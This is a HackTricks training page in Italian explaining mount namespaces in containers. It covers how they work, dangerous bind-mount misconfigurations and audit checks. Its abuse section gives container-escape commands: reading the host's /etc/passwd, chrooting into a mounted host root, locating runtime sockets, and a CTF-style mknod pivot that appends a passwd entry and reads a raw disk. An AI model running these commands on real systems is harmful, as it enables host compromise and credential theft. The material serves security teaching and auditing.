# Namespace di mount

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il mount namespace controlla la **mount table** che un processo vede. Questa è una delle funzionalità di isolamento dei container più importanti perché il filesystem root, i bind mounts, i mount tmpfs, la vista di procfs, l'esposizione di sysfs e molti helper mount specifici del runtime sono tutti espressi attraverso quella mount table. Due processi possono entrambi accedere a `/`, `/proc`, `/sys`, o `/tmp`, ma ciò a cui questi percorsi corrispondono dipende dal mount namespace in cui si trovano.

Dal punto di vista della container-security, il mount namespace è spesso la differenza tra "questo è un filesystem dell'applicazione accuratamente preparato" e "questo processo può vedere o influenzare direttamente il filesystem host". Per questo motivo bind mounts, i volumi `hostPath`, operazioni di mount con privilegi e l'esposizione scrivibile di `/proc` o `/sys` ruotano tutti attorno a questo namespace.

## Funzionamento

Quando un runtime avvia un container, di solito crea un nuovo mount namespace, prepara un filesystem root per il container, monta procfs e altri filesystem di supporto secondo necessità, e poi opzionalmente aggiunge bind mounts, mount tmpfs, secrets, config maps o host paths. Una volta che quel processo è in esecuzione all'interno del namespace, l'insieme dei mount che vede è in gran parte disaccoppiato dalla vista predefinita dell'host. L'host può ancora vedere il filesystem sottostante reale, ma il container vede la versione assemblata per esso dal runtime.

Questo è potente perché permette al container di credere di avere il proprio filesystem root anche se l'host gestisce ancora tutto. È anche pericoloso perché se il runtime espone il mount sbagliato, il processo guadagna improvvisamente visibilità su risorse dell'host che il resto del modello di sicurezza potrebbe non essere progettato per proteggere.

## Laboratorio

Puoi creare un mount namespace privato con:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Se apri un'altra shell al di fuori di quel namespace e ispezioni la mount table, vedrai che il mount tmpfs esiste solo all'interno della mount namespace isolata. Questo è un esercizio utile perché mostra che l'isolamento dei mount non è teoria astratta; il kernel sta letteralmente presentando una tabella di mount diversa al processo.

Se apri un'altra shell al di fuori di quel namespace e ispezioni la mount table, il mount tmpfs esisterà solo all'interno della mount namespace isolata.

All'interno dei container, un rapido confronto è:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Il secondo esempio dimostra quanto sia facile per una configurazione di runtime creare un enorme varco attraverso il confine del filesystem.

## Uso a runtime

Docker, Podman, containerd-based stacks, and CRI-O si basano tutti su un mount namespace privato per i container normali. Kubernetes sfrutta lo stesso meccanismo per volumes, projected secrets, config maps e i mount `hostPath`. Gli ambienti Incus/LXC si affidano anch'essi pesantemente ai mount namespaces, soprattutto perché i system containers spesso espongono filesystem più ricchi e più simili a quelli di una macchina rispetto agli application containers.

Questo significa che quando esamini un problema del filesystem di un container, di solito non stai guardando una stranezza isolata di Docker. Stai osservando un problema di mount-namespace e di configurazione di runtime espresso attraverso qualunque piattaforma abbia avviato il carico di lavoro.

## Errori di configurazione

L'errore più ovvio e pericoloso è esporre il root filesystem dell'host o un altro path sensibile dell'host tramite un bind mount, per esempio `-v /:/host` o un `hostPath` scrivibile in Kubernetes. A quel punto la domanda non è più "il container può in qualche modo evadere?" ma piuttosto "quanti contenuti utili dell'host sono già visibili e scrivibili direttamente?" Un host bind mount scrivibile spesso trasforma il resto dell'exploit in una semplice questione di posizionamento di file, chrooting, modifica delle config o scoperta dei socket di runtime.

Un altro problema comune è esporre l'host `/proc` o `/sys` in modi che aggirano la vista più sicura del container. Questi filesystem non sono normali mount di dati; sono interfacce verso lo stato del kernel e dei processi. Se il workload raggiunge direttamente le versioni dell'host, molte delle assunzioni alla base dell'hardening dei container cessano di applicarsi in modo pulito.

Anche le protezioni in sola lettura contano. Un root filesystem in sola lettura non rende magicamente sicuro un container, ma elimina una grande quantità di spazio di staging per l'attaccante e rende più difficili la persistenza, il posizionamento di helper-binary e la manomissione delle config. Viceversa, un root scrivibile o un host bind mount scrivibile offre all'attaccante spazio per preparare il passo successivo.

## Abusi

Quando il mount namespace viene usato in modo improprio, gli attaccanti di solito fanno una di quattro cose. Essi **leggono dati dell'host** che avrebbero dovuto rimanere fuori dal container. Essi **modificano la configurazione dell'host** tramite bind mount scrivibili. Essi **montano o rimontano risorse aggiuntive** se capabilities e seccomp lo permettono. Oppure **raggiungono socket potenti e directory di stato runtime** che permettono loro di richiedere più accesso alla piattaforma container stessa.

Se il container può già vedere il filesystem dell'host, il resto del modello di sicurezza cambia immediatamente.

Quando sospetti un host bind mount, conferma innanzitutto cosa è disponibile e se è scrivibile:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Se il root filesystem dell'host è montato in lettura-scrittura, l'accesso diretto all'host è spesso semplice come:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Se l'obiettivo è l'accesso privilegiato al runtime anziché il chrooting diretto, enumerare sockets e lo stato del runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Se `CAP_SYS_ADMIN` è presente, verifica anche se è possibile creare nuovi mount dall'interno del container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Esempio completo: Two-Shell `mknod` Pivot

Un percorso di abuso più specializzato si presenta quando il container root user può creare block devices, l'host e il container condividono un'identità utente in modo utile, e l'attacker ha già una foothold low-privilege sull'host. In quella situazione, il container può creare un device node come `/dev/sda`, e l'utente host low-privilege può poi leggerlo tramite `/proc/<pid>/root/` per il processo corrispondente del container.

All'interno del container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Dall'host, come l'utente a basso privilegio corrispondente dopo aver individuato il PID della shell del container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La lezione importante non è la ricerca della stringa esatta usata in un CTF. È che l'esposizione del mount namespace attraverso `/proc/<pid>/root/` può permettere a un utente dell'host di riutilizzare device node creati dal container anche quando la cgroup device policy impediva l'uso diretto all'interno del container stesso.

## Controlli

Questi comandi servono a mostrarti la vista del filesystem in cui il processo corrente si trova effettivamente. L'obiettivo è individuare mount derivati dall'host, percorsi sensibili scrivibili e qualsiasi cosa che appaia più ampia rispetto a un normale filesystem root di un application container.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Cosa è interessante qui:

- I Bind mounts provenienti dall'host, specialmente `/`, `/proc`, `/sys`, le directory di stato runtime o le posizioni di socket, dovrebbero risaltare immediatamente.
- I read-write mounts inaspettati sono solitamente più importanti di un gran numero di read-only helper mounts.
- `mountinfo` è spesso il posto migliore per vedere se un percorso è davvero host-derived o basato su overlay.

Questi controlli stabiliscono **quali risorse sono visibili in questo namespace**, **quali sono host-derived**, e **quali di esse sono writable o security-sensitive**.
{{#include ../../../../../banners/hacktricks-training.md}}
